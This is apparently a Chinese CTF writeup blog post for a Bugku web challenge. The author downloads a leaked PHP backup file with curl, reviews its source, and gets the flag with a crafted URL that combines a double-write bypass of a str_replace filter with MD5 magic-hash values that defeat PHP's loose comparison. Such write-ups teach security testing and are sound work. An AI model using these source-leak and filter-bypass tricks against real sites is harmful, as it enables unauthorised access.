---
layout: post
title: 'Bugku Web 备份是个好习惯 Writeup'
date: "2026-09-24 18:00:00 +0800"
categories: [CTF, Bugku, Web]
---

## 一、 题目信息
- **平台**：Bugku
- **题型**：Web
- **考点**：源码泄露、备份文件猜测、PHP 弱类型比较、str_replace 双写绕过

## 二、 解题思路与踩坑记录
刚拿到这道题，点进网页后只有一段乱码。我一开始尝试用浏览器直接在地址栏拼接index.php.bak想下载源码，结果浏览器出于安全机制把下载直接拦截了，试了好几次都不行.

后来我回忆起了之前用过的方法，切换到了 Kali Linux 的终端，利用 `curl -O` 命令强行下载。这一次成功了！拿到 `index.php.bak` 后，我用 `cat` 命令查看了源码，一眼就看到了 `str_replace('key', '', $str)` 这个过滤逻辑，意识到这是一道代码审计加弱类型绕过的题。

## 三、 解题步骤（真实解密过程）

1. **获取源码**：
   在 Kali 终端执行：`curl -O http://160.202.254.160:12435/index.php.bak`
   下载成功后，用 `cat index.php.bak` 查看源码。

2. **审计源码，寻找破绽**：
   源码核心逻辑如下：
   ```php
   include_once "flag.php";
   $str = strstr($_SERVER['REQUEST_URI'], '?');
   $str = substr($str, 1);
   $str = str_replace('key', '', $str); // 过滤了 key 单词
   parse_str($str);
   if(md5($key1) == md5($key2) && $key1 !== $key2){
       echo $flag."取得flag";
   }

  通过ai翻译代码后，在网址中输入http://160.202.254.160:12435/?kekeyy1=QNKCDZO&kekeyy2=240610708即可得到flag。
